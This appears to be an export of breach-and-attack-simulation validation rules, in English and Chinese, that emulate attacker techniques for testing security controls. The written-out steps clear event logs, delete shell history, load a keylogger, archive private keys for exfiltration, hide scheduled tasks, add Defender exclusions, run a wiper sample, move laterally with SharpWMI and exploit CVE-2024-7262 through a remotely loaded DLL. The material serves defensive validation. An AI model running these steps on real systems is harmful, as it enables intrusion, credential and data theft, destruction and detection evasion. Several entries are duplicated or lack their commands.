exact_source_fields.desc: This validation rule simulates a validator attempting to collect information about an infected host using the systeminfo command. The systeminfo command prints detailed configuration information about the host, including operating system configuration, security information, hardware properties, and network card information. This information can be used to identify operating system and hardware versions as well as corresponding vulnerabilities in the environment. Note: This validation rule is considered a "weak signal" operation. This means that the behavior it displays does not always indicate malicious campaign and can match legitimate users or manage campaigns. When you run a weak signal operation alone, it is unlikely to be blocked by security controls. The best practice is to ensure that your security controls provide visibility into such behavior. This allows you to associate campaigns with higher fidelity signals for detection or for threat search.

 auto,4,true,60
  success_match:(Host Name)|(OS Name)|(OS Version)|(Windows Directory)|(Domain)

exact_source_fields.desc: This validation rule simulates how to change the target path of a shortcut on the computer. When executing shortcuts, they refer to the complete path of a specific program, file, or executable file. Adversary will change or create shortcuts to malicious files in an attempt to obtain persistence or allow users to click on shortcuts they consider legitimate. This validation rule will create a new calc.exe shortcut. The validation action will then change the target path to notepad.exe. The shortcut will be cleared and deleted by the operation.

host_cli_action.raw_text:
$Wscriptsh = New-Object -ComObject Wscript.Shell
  auto,4,true,60
  success_zero

$Shortcut = $Wscriptsh.CreateShortcut("C:\Users\Public\Documents\notepad.lnk")
  auto,4,true,60
  success_zero

$Shortcut.TargetPath = 'C:\Windows\System32\calc.exe'
  auto,4,true,60
  success_zero
  
$Shortcut.Save()
  auto,4,true,60
  success_zero

$Shortcut.TargetPath = 'C:\Windows\System32\notepad.exe'
  auto,4,true,60
  success_zero
  
$Shortcut.Save()
  auto,4,true,60
  success_zero
  
C:\Users\Public\Documents\notepad.lnk
  auto,20,true,60
  success_zero

Get-Process -Name notepad
  auto,4,true,60
  blocked_match:cannot find a process with the name "notepad"

Remove-Item -Path 'C:\Users\Public\Documents\notepad.lnk'
  auto,4,true,60
  cleanup

Stop-Process -Name notepad
  auto,4,true,60
  cleanup

steps.blocked_match: cannot find a process with the name "notepad"

exact_source_fields.desc: This validation rule simulates how to change the target path of a shortcut on the computer. When executing shortcuts, they refer to the complete path of a specific program, file, or executable file. Adversary will change or create shortcuts to malicious files in an attempt to obtain persistence or allow users to click on shortcuts they consider legitimate. This validation rule will create a new calc.exe shortcut. The validation action will then change the target path to notepad.exe. The shortcut will be cleared and deleted by the operation.

host_cli_action.raw_text:
$Wscriptsh = New-Object -ComObject Wscript.Shell
  auto,4,true,60
  success_zero

$Shortcut = $Wscriptsh.CreateShortcut("C:\Users\Public\Documents\notepad.lnk")
  auto,4,true,60
  success_zero

$Shortcut.TargetPath = 'C:\Windows\System32\calc.exe'
  auto,4,true,60
  success_zero
  
$Shortcut.Save()
  auto,4,true,60
  success_zero

$Shortcut.TargetPath = 'C:\Windows\System32\notepad.exe'
  auto,4,true,60
  success_zero
  
$Shortcut.Save()
  auto,4,true,60
  success_zero
  
C:\Users\Public\Documents\notepad.lnk
  auto,20,true,60
  success_zero

Get-Process -Name notepad
  auto,4,true,60
  blocked_match:cannot find a process with the name "notepad"

Remove-Item -Path 'C:\Users\Public\Documents\notepad.lnk'
  auto,4,true,60
  cleanup

Stop-Process -Name notepad
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates the deletion of the user's. bash \ _history file on the Windows subsystem (WSL) for Linux Bash \ _history contains previous commands executed from the command line after exiting the shell. Adversary may clear the contents of files as a way to hide traces on the system. There are multiple methods to clear. bash \ _history files from the device. Although this method does delete files, it is not as covert as expected. After the user exits the bash shell, all commands issued during that session will be written to a new. bash \ _history file. If someone wants to view its content, it is obvious that someone has tampered with the file.

  auto,4,true,60
  error_match:is not recognized as the name of a cmdlet

  auto,4,true,60
  success_zero

wsl rm -f ~/.bash_history
  auto,4,true,60
  success_zero
  
wsl ls -la ~/
  auto,4,true,60
  blocked_match:bash_history

wsl mv ~/.bash.bak ~/.bash_history
  auto,4,true,3
  cleanup

The systeminfo command prints detailed configuration information about the host, including operating system configuration, security information, hardware properties, and network card information. This information can be used to identify operating system and hardware versions as well as corresponding vulnerabilities in the environment. Note: This validation rule is considered a "weak signal" operation. This means that the behavior it displays does not always indicate malicious campaign and can match legitimate users or manage campaigns. When you run a weak signal operation alone, it is unlikely to be blocked by security controls. The best practice is to ensure that your security controls provide visibility into such behavior. This allows you to associate campaigns with higher fidelity signals for detection or for threat search.

exact_source_fields.desc: This validation rule simulates an adversary attempt to discover a running process on an infected host. Adversary will attempt to discover processes to determine which tools and applications can be installed. This information may lead to the discovery of vulnerable tools, applications, or configurations to exploit or defend against measures, such as host based intrusion detection, which should be avoided. Note: This validation rule is considered a "weak signal" operation. This means that the behavior it displays does not always indicate malicious activity and can match legitimate users or manage activity. When you run a weak signal validation rule alone, it is unlikely to be blocked by security defense devices. The best practice is to ensure that your security defense equipment provides visibility into such behavior. This allows you to associate total campaign with higher fidelity signals for detection or for threat hunting.

exact_source_fields.desc: This validation rule simulates the deletion of the user's. bash \ _history file on the Windows subsystem (WSL) for Linux Bash \ _history contains previous commands executed from the command line after exiting the shell. Adversary may clear the contents of files as a way to hide traces on the system. There are multiple methods to clear. bash \ _history files from the device. Although this method does delete files, it is not as covert as expected. After the user exits the bash shell, all commands issued during that session will be written to a new. bash \ _history file. If someone wants to view its content, it is obvious that someone has tampered with the file.

host_cli_action.raw_text:
Get-Command wsl
  auto,4,true,60
  error_match:is not recognized as the name of a cmdlet

wsl cp ~/.bash_history ~/.bash.bak
  auto,4,true,60
  success_zero

wsl rm -f ~/.bash_history
  auto,4,true,60
  success_zero
  
wsl ls -la ~/
  auto,4,true,60
  blocked_match:bash_history

wsl mv ~/.bash.bak ~/.bash_history
  auto,4,true,3
  cleanup

steps.error_match: is not recognized as the name of a cmdlet

此验证动作还原了一个验证机器人 尝试使用 systeminfo 命令收集有关受感染主机的信息。systeminfo 命令打印有关主机的详细配置信息，包括操作系统配置、安全信息和硬件属性以及网卡信息。此信息可用于识别环境中的操作系统和硬件版本以及相应的漏洞。
注意：此验证动作被视为"弱信号"操作。这意味着它展示的行为并不总是表示恶意活动，并且可以匹配合法用户或管理活动。当您单独运行弱信号操作时，它不太可能被安全控制阻止。最佳实践是确保您的安全控制提供对此类行为的可见性。这使您可以将活动与更高保真度的信号关联起来以进行检测或用于威胁搜寻。

exact_source_fields.desc: This validation rule simulates a validator attempting to collect information about an infected host using the systeminfo command. The systeminfo command prints detailed configuration information about the host, including operating system configuration, security information, hardware properties, and network card information. This information can be used to identify operating system and hardware versions as well as corresponding vulnerabilities in the environment. Note: This validation rule is considered a "weak signal" operation. This means that the behavior it displays does not always indicate malicious campaign and can match legitimate users or manage campaigns. When you run a weak signal operation alone, it is unlikely to be blocked by security controls. The best practice is to ensure that your security controls provide visibility into such behavior. This allows you to associate campaigns with higher fidelity signals for detection or for threat search.

host_cli_action.raw_text:
systeminfo
 auto,4,true,60
  success_match:(Host Name)|(OS Name)|(OS Version)|(Windows Directory)|(Domain)

dir & rd /s /q C:\Users\Public\Documents\{{v_action_id}}

exact_source_fields.desc: This validation rule simulates an application attempting to detect whether it is running in the context of the debugger by calling the "IsDebuggerPresent" function. Debuggers are often used for malware analysis to understand the functionality of malware. If certain malware (including variants of MAZE ransomware) is found running in the debugger, it will stop executing. Note: If the debugger is found, the fact of checking the existence of the debugger is restored based on this validation rule. This validation rule will be displayed as blocked, and if the debugger is found, it will stop executing.

C:\Users\Public\Documents\debuggercheck.exe
  auto,4,true,60
  success_match:Debugger not found
  blocked_match:Debugger found
 
del C:\Users\Public\Documents\debuggercheck.exe
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates the deletion of the user's. bash \ _history file on the Windows subsystem (WSL) for Linux Bash \ _history contains previous commands executed from the command line after exiting the shell. Adversary may clear the contents of files as a way to hide traces on the system. There are multiple methods to clear. bash \ _history files from the device. Although this method does delete files, it is not as covert as expected. After the user exits the bash shell, all commands issued during that session will be written to a new. bash \ _history file. If someone wants to view its content, it is obvious that someone has tampered with the file.

  auto,4,true,60
  error_match:is not recognized as the name of a cmdlet

wsl cp ~/.bash_history ~/.bash.bak
  auto,4,true,60
  success_zero

wsl rm -f ~/.bash_history
  auto,4,true,60
  success_zero
  
wsl ls -la ~/
  auto,4,true,60
  blocked_match:bash_history

wsl mv ~/.bash.bak ~/.bash_history
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates a validator using WMIC to identify third-party software installed on the host. Third party software not only rarely updates as frequently as Microsoft products, but they also provide Adversary with a way to execute code on remote systems. In this way, Adversary can utilize third-party software for lateral movement. Third party software, especially those used for network management, should be regularly evaluated. The application whitelist and strict monitoring of third-party software deployment can reduce the risk of such behavior. Note: This validation rule is considered a "weak signal" operation. This means that the behavior it displays does not always indicate malicious activity and can match legitimate users or manage activity. When you run a weak signal validation rule alone, it is unlikely to be blocked by security controls. The best practice is to ensure that your security controls provide visibility into such behavior. This allows you to associate Campaign with higher fidelity signals for detection or for threat hunting.

exact_source_fields.desc: This validation rule simulates a encoding of the Powershell command "whoami" on the victim host. Encoding Powershell commands on the victim's machine is a way for Adversary to obfuscate malicious code and evade detection. Encoding commands in Powershell is a way for Adversary to utilize these off ground policies to perform various activities, such as executing code, downloading or uploading files, maintaining persistence, etc.

host_cli_action.raw_text:
$command = 'whoami'
  auto,4,true,60
  success_zero

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  auto,4,true,60
  success_zero

$encodedCommand = [Convert]::ToBase64String($bytes)
  auto,4,true,60
  success_zero

$a = powershell.exe -encodedCommand $encodedCommand
  auto,4,true,60
  success_zero

$b = whoami
  auto,4,true,60
  success_zero

$a -eq $b
  auto,4,true,60
  success_match:True

  auto,4,true,60

  auto,4,true,60

exact_source_fields.desc: This validation rule simulates searching for. pst files at different locations on the computer and collecting important data from them, including file path location and file name. Personal storage files (. pst) contain copies of calendar events, emails, and other data stored by Microsoft software. Adversary targets these files and collects sensitive data from specific individuals. This validation rule will search for any. pst file in two different file path locations and create a .csv file containing the collected file information The CSV file will be deleted through a clean validation action. Note: If the. pst file is not found on the device, This validation rule will be displayed as blocked.

host_cli_action.raw_text:
if ( (Test-Path -Path C:\Users\$env:UserName\Documents\Outlook*) -eq $True){Get-Childitem -Path C:\Users\$env:UserName\Documents\'Outlook Files'\* -Include *.pst | Select-Object FullName, Length, Directory | Export-Csv 'C:\Users\Public\Documents\pst.csv'} Elseif ( (Test-Path -Path C:\Users\$env:UserName\AppData\Local\Microsoft\Outlook\) -eq $True){Get-ChildItem -Path C:\Users\$env:UserName\AppData\Local\Microsoft\Outlook\* -Include *.pst | Select-Object FullName, Length, Directory | Export-Csv 'C:\Users\Public\Documents\pst.csv'}
  auto,60,true,70
  success_zero

  
Get-ChildItem 'C:\Users\Public\Documents' | findstr "pst.csv"
  auto,4,true,60
  success_match:pst
 
# Put cleanup here (optional):
Get-ChildItem 'C:\Users\Public\Documents' | Where {$_.Name -Match "pst\.csv"} | Foreach ($_) {Remove-Item $_.fullname}
  auto,4,true,3
  cleanup

steps.command: if ( (Test-Path -Path C:\Users\$env:UserName\Documents\Outlook*) -eq $True){Get-Childitem -Path C:\Users\$env:UserName\Documents\'Outlook Files'\* -Include *.pst | Select-Object FullName, Length, Directory | Export-Csv 'C:\Users\Public\Documents\pst.csv'} Elseif ( (Test-Path -Path C:\Users\$env:UserName\AppData\Local\Microsoft\Outlook\) -eq $True){Get-ChildItem -Path C:\Users\$env:UserName\AppData\Local\Microsoft\Outlook\* -Include *.pst | Select-Object FullName, Length, Directory | Export-Csv 'C:\Users\Public\Documents\pst.csv'}

此验证动作还原了在计算机上的不同位置搜索 .pst 文件并从 .pst 文件中收集重要数据，包括文件路径位置和文件名。个人存储文件 (.pst) 包含日历事件、电子邮件和其他数据的副本，由 Microsoft 软件存储。攻击者以这些文件为目标，从特定人员那里收集敏感数据。

此验证动作将在两个不同的文件路径位置搜索任何 .pst 文件，并将创建一个包含收集的文件信息的 .csv 文件。 .csv 文件将通过清理验证动作删除。 注意：如果在设备上没有找到 .pst 文件，此验证动作将显示为阻断状态。

exact_source_fields.desc: This validation rule simulates searching for. pst files at different locations on the computer and collecting important data from them, including file path location and file name. Personal storage files (. pst) contain copies of calendar events, emails, and other data stored by Microsoft software. Adversary targets these files and collects sensitive data from specific individuals. This validation rule will search for any. pst file in two different file path locations and create a .csv file containing the collected file information The CSV file will be deleted through a clean validation action. Note: If the. pst file is not found on the device, This validation rule will be displayed as blocked.

host_cli_action.raw_text:
if ( (Test-Path -Path C:\Users\$env:UserName\Documents\Outlook*) -eq $True){Get-Childitem -Path C:\Users\$env:UserName\Documents\'Outlook Files'\* -Include *.pst | Select-Object FullName, Length, Directory | Export-Csv 'C:\Users\Public\Documents\pst.csv'} Elseif ( (Test-Path -Path C:\Users\$env:UserName\AppData\Local\Microsoft\Outlook\) -eq $True){Get-ChildItem -Path C:\Users\$env:UserName\AppData\Local\Microsoft\Outlook\* -Include *.pst | Select-Object FullName, Length, Directory | Export-Csv 'C:\Users\Public\Documents\pst.csv'}
  auto,60,true,70
  success_zero

  
Get-ChildItem 'C:\Users\Public\Documents' | findstr "pst.csv"
  auto,4,true,60
  success_match:pst
 
# Put cleanup here (optional):
Get-ChildItem 'C:\Users\Public\Documents' | Where {$_.Name -Match "pst\.csv"} | Foreach ($_) {Remove-Item $_.fullname}
  auto,4,true,3
  cleanup

steps.command: if ( (Test-Path -Path C:\Users\$env:UserName\Documents\Outlook*) -eq $True){Get-Childitem -Path C:\Users\$env:UserName\Documents\'Outlook Files'\* -Include *.pst | Select-Object FullName, Length, Directory | Export-Csv 'C:\Users\Public\Documents\pst.csv'} Elseif ( (Test-Path -Path C:\Users\$env:UserName\AppData\Local\Microsoft\Outlook\) -eq $True){Get-ChildItem -Path C:\Users\$env:UserName\AppData\Local\Microsoft\Outlook\* -Include *.pst | Select-Object FullName, Length, Directory | Export-Csv 'C:\Users\Public\Documents\pst.csv'}

exact_source_fields.desc: This validation rule simulates adversary to perform Lateral movement attacks on the intranet by using the Sharpwmi tool. Sharpwmi is a tool that uses wmic to perform Lateral movement. It writes data to the remote host registry by executing commands and connects to the registry to obtain command execution results. It relies on ports 135 and 49666 for data transmission and allows adversary to upload malicious files or execute malicious commands on the target host.

host_cli_action.raw_text:
reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4.0"  || echo e^r^r^o^r
whoami
cd  C:\Users\Public\Documents\{{v_action_id}}  &&  start /b sharpwmi.exe {{v_action_host}} {{v_action_username}}  {{v_action_password}} cmd whoami  > whoami.txt
type whoami.txt
cd ..  && rd /s /q C:\Users\Public\Documents\{{v_action_id}}

此验证动作还原了一个尝试使用 PowerShell 清除主机上的安全窗口事件日志的攻击者的模拟。在此示例中，-WhatIf 命令用于防止事件日志在生产机器上被意外清除。这将允许基于命令行的检测发出警报，但可能不会触发围绕事件日志的任何基于事件 ID 的检测。
清除 Windows 事件日志可以删除主机上的危害指标。攻击者通常会尝试删除危害指标，以降低检测的可能性并阻碍潜在的事件响应工作。如果没有特定的危害指标，事件响应者可能无法完全确定危害程度，从而使攻击者能够在环境中站稳脚跟。

exact_source_fields.desc: This validation rule simulates a simulation of using PowerShell to clear the security window event log on the host in adversary. In this sample, the - WhatIf command is used to prevent event logs from being accidentally cleared on the production machine. This will allow command line based detection to issue alerts, but may not trigger any event ID based detection around the event log. Clearing the Windows event log can delete hazard indicators on the host. Adversary typically attempts to remove hazard indicators to reduce the likelihood of detection and hinder potential event response efforts. If there are no specific hazard indicators, event responders may not be able to fully determine the degree of harm, allowing adversary to stand firm in the environment.

Clear-Eventlog -LogName Security -WhatIf
  auto,4,true,60
  success_match:Performing the operation \"Clear-EventLog\" on target

exact_source_fields.desc: This validation rule simulates the threat group APT-C-60 to verify whether the host WPS program has the promecefpluginhost component hijacking vulnerability (CVE-2024-7262) by creating a malicious ksoqing protocol. The main reason for this vulnerability is due to improper path verification, which allows adversary to load and execute arbitrary Windows libraries. adversary can load malicious Windows libraries by tricking users into opening a deceptive spreadsheet document. A single-click attack may allow adversary to execute arbitrary code on the victim's machine, resulting in data theft, ransomware, or further system damage. This rule uses remote loading of DLL to verify the vulnerability. Vulnerability impact range: (1) International version: 12.2.0.13110 - 12.2.0.13489; (2) Domestic version: 12.1.0.16120. Dependency: The WPS program needs to be installed.

host_cli_action.raw_text:
whoami
powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Public\Documents\{{v_action_id}}\CVE-2024-7262_net.ps1" -mhtmlFilePath "C:\Users\Public\Documents\{{v_action_id}}\wpspoc.mhtml" -hTargetUrl "http://{{v_htarget}}:3344/calc.dll"
tasklist /svc | findstr /i calc
taskkill /f /im calculator.exe || taskkill /f /im win32calc.exe || taskkill /f /im calc.exe || taskkill /f /im calculatorapp.exe
taskkill /f /im wps.exe
rd /s /q C:\Users\Public\Documents\{{v_action_id}}
Start-Sleep -Seconds 30
dir

steps.command: taskkill /f /im calculator.exe || taskkill /f /im win32calc.exe || taskkill /f /im calc.exe || taskkill /f /im calculatorapp.exe

exact_source_fields.action_description: 此验证动作还原了对 LOCKBIT.BLACK 执行勒索软件防御验证样本的尝试。 LOCKBIT.BLACK是用C语言编写的勒索软件，可以加密本地文件。加密文件被设置为随机的 7 个字符文件名，具有固定扩展名，勒索信息将写入包含加密文件的目录中。 LOCKBIT.BLACK 可能会篡改 Windows Defender 和 Windows 事件日志设置。 LOCKBIT.BLACK 与 BLACKMATTER 共享很大一部分代码，包括反分析、反调试和 API 混淆代码中的重叠。

exact_source_fields.desc: This validation rule simulates an attempt to ransomware defense validation samples for LockBIT.BLACK. LockBIT.BLACK is a ransomware written in C language that can encrypt local files. The encrypted file is set to a random 7-character file name with a fixed extension, and ransomware information will be written to the directory containing the encrypted file. LockBIT.BLACK may tamper with Windows Defender and Windows event log settings. LockBIT.BLACK shares a significant portion of code with BLACKMATTER, including overlap in anti analysis, anti debugging, and API obfuscation code.

host_cli_action.raw_text:
$Domain = New-Object System.DirectoryServices.DirectoryEntry
  auto,4,true,90
  success_zero
  
$Searcher = New-Object System.DirectoryServices.DirectorySearcher
  auto,4,true,90
  success_zero
  
$Searcher.SearchRoot = $Domain
  auto,4,true,90
  success_zero
  
$Searcher.PageSize = 5
  auto,4,true,90
  success_zero
  
$Searcher.SearchScope = "subtree"
  auto,4,true,90
  success_zero
  
$Searcher.PropertiesToLoad.Add("distinguishedName") > $Null
  auto,4,true,90
  success_zero
  
$Searcher.PropertiesToLoad.Add("Name") > $Null
  auto,4,true,90
  success_zero
  
$Searcher.Filter = "(objectCategory=organizationalUnit)"
  auto,4,true,90
  success_zero
  
$Searcher.FindAll() | foreach {[pscustomobject]@{'Name' = $_.Properties['name'][0]; 'DistinguishedName' = $_.Properties['distinguishedname'][0]}}
  auto,4,true,90
  success_match:DistinguishedName

exact_source_fields.desc: This validation rule simulates an adversary that attempted to clear the security window event log on the host using PowerShell. Clearing the Windows event log can delete hazard indicators on the host. Adversary typically attempts to remove hazard indicators to reduce the likelihood of detection and hinder potential event response efforts. If there are no specific hazard indicators, event responders may not be able to fully determine the degree of harm, allowing adversary to stand firm in the environment. Adversary has used this defense bypass technique to cover up their tracks on infected hosts.

Clear-Eventlog -LogName Security
  auto,4,true,60
  success_zero

Get-Eventlog -LogName Security | Select TimeGenerated,EntryType,Message | Format-Table
  auto,4,true,60
  success_match:audit log was cleared

exact_source_fields.desc: This validation rule simulates the FTCODE generated victim ID. FTCODE generates a Guid (used as the victim ID) and a random password of 50 characters. Then it writes the Guid to% PUBLIC%\OracleKit\w00log03.tmp. This Guid is the way FTCODE operators understand their victims. Later in the execution chain, this Guid will be uploaded to C2. FTCODE is a series of ransomware based on PowerShell that appends "FTCODE" to the file name of encrypted files. It uses the Rijndael algorithm to encrypt target files on infected hosts. The observed samples have been delivered together with the JASPERLOADER malware series through malicious Microsoft Word documents.

host_cli_action.raw_text:
add-type -AssemblyName System.Web
  auto,4,true,60
  success_zero
  
$xaebfyxj = $env:PUBLIC + "\OracleKit";
  auto,4,true,60
  success_zero
 
if (-not (Test-Path $xaebfyxj)) { md $xaebfyxj; }
  auto,4,true,60
  success_zero

$yxzsjdaz = $xaebfyxj + "\w00log03.tmp";
  auto,4,true,60
  success_zero

$ustjwdc=[guid]::NewGuid();
  auto,4,true,60
  success_zero
  
$wjfshjyac=[Web.Security.Membership]::GeneratePassword(50, 4);
  auto,4,true,60
  success_zero
  
[byte[]]$vzycswx = [system.Text.Encoding]::Unicode.GetBytes($wjfshjyac);
  auto,4,true,60
  success_zero
  
$iicugvhzfg = "BgIAAACkAABSU0ExAAQAAAEAAQDTYUZyVxhh48R/1Y/H5NdEgi49DIHtJTXm+mcVHnvUpYiNEnxpFj/UJXVDg0F2rfWFpnyqHJ0dbyjsOCwMX0eRyp2VxrWFzOHIM6QpevxGF9izXeNq7+OzBuo11V/7EmvQBW2sfuNEOP7zdUw0DFKoK+X2Taewaki1LGYhpshjqg==";
  auto,4,true,60
  success_zero
  
$jtyvcfuibf = New-Object System.Security.Cryptography.RSACryptoServiceProvider;
  auto,4,true,60
  success_zero
  
$jtyvcfuibf.ImportCspBlob([system.Convert]::FromBase64String($iicugvhzfg));
  auto,4,true,60
  success_zero
  
$efwzsyc = [system.Convert]::ToBase64String($jtyvcfuibf.Encrypt($vzycswx, $false));
  auto,4,true,60
  success_zero
  
sc -Path $yxzsjdaz -Value $ustjwdc -Force;
  auto,4,true,60
  success_zero

Get-Content $yxzsjdaz
  auto,4,true,60
  success_match:[{]?[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}[}]?
  
Remove-Item $xaebfyxj -Recurse
	auto,4,true,3
	cleanup

exact_source_fields.desc: This validation rule simulates the installation of the keyboard recorder by adversary on the local computer. Intruders use a technique to load keyboard recorder keys without touching the hard drive (except for writing output). In addition, encoding is used to obfuscate PowerShell commands. Although the advantage of this technology is that it is more difficult to detect locally, it also brings limitations. For example, the PS1 file must be transmitted over the Internet to give defenders the opportunity to recognize scripts on the network. In addition, due to the keyboard recorder running in memory, its functionality will terminate when the PowerShell session is closed. Please note that the keyboard recorder installed in this validation rule will be deleted during the cleaning process.

import-module 'C:\users\public\documents\gksobf.ps1'
  auto,4,true,60
  success_zero
 
Get-Keystrokes -Timeout 10 -LogPath C:\users\public\documents\key.log
 auto,15,true,60
 success_zero
  
cat C:\users\public\documents\key.log
  auto,4,true,60
  success_match:"TypedKey"
  
erase C:\users\public\documents\gksobf.ps1
  auto,4,true,3
  cleanup

erase C:\users\public\documents\key.log
  auto,4,true,3
  cleanup

Run PowerShell scripts to search for various key files, such as. cer and.pgp. Any critical files identified on the host's local, removable, optical drive, or network drive will be added to the archive for future infiltration.

host_cli_action.raw_text:
#Generate random name for archive
$rname = -join ((48..57)+(65..90)+(97..122)  | Get-Random -Count 7 | % {[char]$_})
  auto,4,true,60
  success_zero

#Find removable disk letters
$RemovableDisk = get-WmiObject Win32_volume -Filter "DriveType='2'" | select -expand driveletter
  auto,4,true,60
  success_zero

#Find local disk letters
$LocalDisk = get-WmiObject Win32_volume -Filter "DriveType='3'" | select -expand driveletter
  auto,4,true,60
  success_zero

#Find network drive letters
$NetworkDrive = get-WmiObject Win32_volume -Filter "DriveType='4'" | select -expand driveletter
  auto,4,true,60
  success_zero

#Find CD drive letters  
$CompactDisk = get-WmiObject Win32_volume -Filter "DriveType='5'" | select -expand driveletter
  auto,4,true,60
  success_zero

#Search for files and add to archive for exfil  
if (($RemovableDisk -Like "*:") -And (Test-Path $RemovableDisk)) { get-childitem -path $RemovableDisk -recurse -include *.key, *.pgp, *.gpg, *.ppk., *.p12, *.pem, *.pfx, *.cer, *.p7b, *.asc | compress-archive -update -destination "C:\users\public\documents\$rname.zip"}
  auto,5,true,60
  success_zero

if (($LocalDisk -Like "*:") -And (Test-Path $LocalDisk\users)) { get-childitem -path $LocalDisk\users -recurse -include *.key, *.pgp, *.gpg, *.ppk., *.p12, *.pem, *.pfx, *.cer, *.p7b, *.asc | compress-archive -update -destination "C:\users\public\documents\$rname.zip"}
  auto,5,true,60
  success_zero
  
if (($NetworkDrive -Like "*:") -And (Test-Path $NetworkDrive)) { get-childitem -path $NetworkDrive -recurse -include *.key, *.pgp, *.gpg, *.ppk., *.p12, *.pem, *.pfx, *.cer, *.p7b, *.asc | compress-archive -update -destination "C:\users\public\documents\$rname.zip"}
  auto,5,true,60
  success_zero

if (($CompactDisk -Like "*:") -And (Test-Path $CompactDisk)) { get-childitem -path $CompactDisk -recurse -include *.key, *.pgp, *.gpg, *.ppk., *.p12, *.pem, *.pfx, *.cer, *.p7b, *.asc | compress-archive -update -destination "C:\users\public\documents\$rname.zip"}
  auto,5,true,60
  success_zero
  
#Display the contents of the public folder to show that the a zip file has been created
dir C:\users\public\documents
  auto,4,true,60
  success_match:zip
  
erase C:\users\public\documents\$rname.*
  auto,4,true,60
  cleanup

exact_source_fields.desc: This validation rule simulates a host infected with DOGCALL (aka ROKRAT) malware. Here, DOGCALL accesses the HKLM\System\CurrentControlSet\Services\msSMBios\Data\SMBiosData registry key to obtain the system manufacturer value to identify the machine type. In addition, DOGCALL collects computer names and verifies the action system version to ensure that it cannot run on Windows XP or Windows Server 2003 systems. DOGCALL is a backdoor that is typically distributed in the form of encoded binary files, downloaded and decrypted through shellcode after utilizing weaponized files. DOGCALL can take screenshots, record keystrokes, evade analysis through anti virtual machine detection, and utilize cloud storage APIs such as pCloud, Box, Dropbox, and Yandex.

This validation rule simulates the method and file used by MAZE to change desktop wallpaper. After MAZE completes encrypting all relevant files, it will update the HKCU\control Panel\Desktop key wallpaper with a file path of% TEMP% \123456789.bmp. The file23456789.bmp has been deleted by malicious software. The message is as follows: Maze Ransomware
Dear user, your file has been encrypted using RSA-2048 and ChaCha algorithms
The only way to restore them is to purchase a decryptor
These algorithms are one of the most powerful
You can read information about them on Wikipedia
If you understand the importance of the situation, you can follow the instructions in the DECRYPT-FILES.HTML file to recover all files
You can decrypt one file for free as proof of work
We know this computer is a home computer
So we will give you an appropriate restoration price

(Get-ItemProperty -path "HKCU:\Control Panel\Desktop").WallPaper

exact_source_fields.desc: This validation rule simulates a persistence method used by the host using TARRASK malware. TARRASK creates a scheduled task and then deletes the SD (Security Descriptor) value in the registry. Deleting this value will cause the task to "disappear" from "schtasks/query" and the task scheduler. Unless the auditor manually checks the above registry path, this task is actually hidden.

host_cli_action.raw_text:
Get-ScheduledTask | findstr "WinUpdate"
  auto,4,true,60
  incompatible_match:WinUpdate

$schtask_reg = get-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
  auto,4,true,60
  success_zero

SCHTASKS /CREATE /SC DAILY /TN WinUpdate /TR "C:\Windows\System32\notepad.exe"
  auto,8,true,60
  success_zero

reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\WinUpdate" /v SD /f
  auto,4,true,60
  success_match:successfully
  
Get-ScheduledTask | findstr "WinUpdate"
  auto,4,true,60
  blocked_match:WinUpdate

SCHTASKS /DELETE /TN WinUpdate /f
  auto,4,true,3
  cleanup
  
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\WinUpdate" /f
  auto,4,true,3
  cleanup
  
set-itemproperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree"
  auto,4,true,3
  cleanup

exact_source_fields.desc: This validation rule simulates the execution of CADDYWIPER. CADDYWIPER is a destructive file eraser written in C language that enumerates physical drives of a file system and overwrites file content and partitions with empty bytes.

host_cli_action.raw_text:
echo 'Test for CADDYWIPER' > C:\Users\Public\Documents\test.txt
  auto,4,true,60
  success_zero

$old_hash = Get-FileHash “C:\Users\Public\Documents\test.txt”
  auto,4,true,60
  success_zero

C:\Users\Public\Documents\cw.exe
  auto,20,true,60
  success_zero

$new_hash = Get-FileHash “C:\Users\Public\Documents\test.txt”
  auto,4,true,60
  success_zero

if ($new_hash.hash -ne $old_hash.hash){Write-Output "File was wiped"} else{$old_hash.hash;$new_hash.hash}
  auto,4,true,60
  success_match:File was wiped

$a = Get-MpPreference; if($a.ExclusionPath -like "%USERPROFILE%"){$b = "True"; $b}
  auto,4,true,60
  incompatible_match:True

Add-MpPreference -ExclusionPath '%USERPROFILE%\*'
  auto,4,true
  success_zero
  
Add-MpPreference -ExclusionPath '%USERPROFILE%'
  auto,4,true
  success_zero
  
Add-MpPreference -ExclusionPath '%USERPROFILE%\'
  auto,4,true
  success_zero

Get-MpPreference | Select-Object -Property ExclusionPath
  auto,4,true,60
  success_match:%USERPROFILE%
  
if($b -ne 'True'){Remove-MpPreference -ExclusionPath '%USERPROFILE%\*'}
  auto,4,true
  cleanup

if($b -ne 'True'){Remove-MpPreference -ExclusionPath '%USERPROFILE%'}
  auto,4,true
  cleanup

if($b -ne 'True'){Remove-MpPreference -ExclusionPath '%USERPROFILE%\'}
  auto,4,true

此验证动作还原了攻击者在本地计算机上安装键盘记录器。 入侵者使用一种技术在不接触硬盘的情况下加载键盘记录器键（写入输出除外）。 此外，编码用于混淆 PowerShell 命令。 虽然这种技术的优点是很难在本地检测，但它也带来了局限性。 例如，ps1 文件必须通过互联网传输，让防御者有机会识别网络上的脚本。 此外，由于键盘记录器在内存中运行，因此在 PowerShell 会话关闭时其功能将终止。

